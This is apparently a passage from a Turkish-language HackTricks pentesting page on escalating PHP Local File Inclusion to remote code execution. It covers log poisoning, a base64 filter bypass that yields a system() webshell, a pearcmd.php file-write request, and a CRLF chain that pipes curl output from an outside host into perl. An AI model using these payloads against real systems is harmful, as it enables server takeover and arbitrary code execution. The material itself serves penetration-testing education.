FTP sunucusu vsftpd için loglar _**/var/log/vsftpd.log**_ konumunda bulunur. Eğer bir Local File Inclusion (LFI) zafiyeti varsa ve erişilebilir bir vsftpd sunucusuna erişim mümkünse, aşağıdaki adımlar düşünülebilir:

1. Giriş işlemi sırasında kullanıcı adı alanına bir PHP payload enjekte edin.
2. Enjeksiyondan sonra, sunucu loglarını almak için LFI'yi kullanın: _**/var/log/vsftpd.log**_.

### php base64 filter (base64 kullanarak)

Bu [bu makalede](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) gösterildiği gibi, PHP base64 filter Non-base64'i yoksayar. Bunu dosya uzantısı kontrolünü atlamak için kullanabilirsiniz: eğer ".php" ile biten bir base64 verirseniz, filtre "."'ı yok sayar ve base64'e "php" ekler. İşte bir örnek payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (dosya gerekmez)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) açıklar ki **php filters ile rastgele içerik üretilebilir** çıktı olarak. Bu temelde, include için **rastgele php kodu üretebileceğiniz** anlamına gelir **bunu bir dosyaya yazmanıza gerek kalmadan**.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Segmentation fault ile

**Yükleyin** `/tmp` içinde **geçici** olarak saklanacak bir dosyayı, sonra **aynı istekte** bir **segmentation fault** tetikleyin; böylece **geçici dosya silinmeyecek** ve onu arayabilirsiniz.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage ile

Eğer bir **Local File Inclusion** bulduysanız ve **Nginx** PHP'nin önünde çalışıyorsa, aşağıdaki teknikle RCE elde edebilirsiniz:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS ile

Eğer bir **Local File Inclusion** bulduysanız, hatta **session'a sahip olmasanız** ve `session.auto_start` `Off` olsa bile. Eğer **multipart POST** verisinde **`PHP_SESSION_UPLOAD_PROGRESS`** sağlarsanız, PHP **session'ı sizin için etkinleştirir**. Bunu RCE elde etmek için kötüye kullanabilirsiniz:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows'ta temp file uploads ile

Eğer bir **Local File Inclusion** bulduysanız ve sunucu **Windows** üzerinde çalışıyorsa RCE elde edebilirsiniz:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args ile

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), script `/usr/local/lib/phppearcmd.php` php docker images içinde varsayılan olarak mevcuttur. Ayrıca, bir URL parametresi `=` içermiyorsa argüman olarak kullanılacağı belirtildiği için script'e URL üzerinden argüman geçirmek mümkündür. Ayrıca bakınız [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) ve [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Aşağıdaki, bir CRLF vuln kullanarak RCE elde ediyor (kaynak: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() ile (file_uploads = on)

Eğer bir **Local File Inclusion** bulduysanız ve **phpinfo()** ile file_uploads = on gösteren bir dosya varsa RCE elde edebilirsiniz:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure ile

Eğer bir **Local File Inclusion** bulduysanız ve temp dosyanın path'ini exfiltrate edebiliyorsanız AMA **server** dahil edilecek dosyanın **PHP marks** olup olmadığını kontrol ediyorsa, bu kontrolü bu **Race Condition** ile atlamayı deneyebilirsiniz:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Sonsuz bekleme + bruteforce ile

Eğer LFI'yi kötüye kullanarak geçici dosyalar yükleyebiliyor ve server'ın PHP yürütmesini takılmaya (hang) zorlayabiliyorsanız, geçici dosyayı bulmak için saatlerce dosya adlarını **brute force** edebilirsiniz:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error'a

Eğer `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarından herhangi birini include ederseniz. (Bu hatayı tetiklemek için aynı dosyayı 2 kez include etmeniz gerekiyor).

**Bunun ne kadar faydalı olduğunu bilmiyorum ama işe yarayabilir.**\
_PHP Fatal Error'a sebep olsanız bile, yüklenen PHP geçici dosyaları silinir._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Referanslar

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
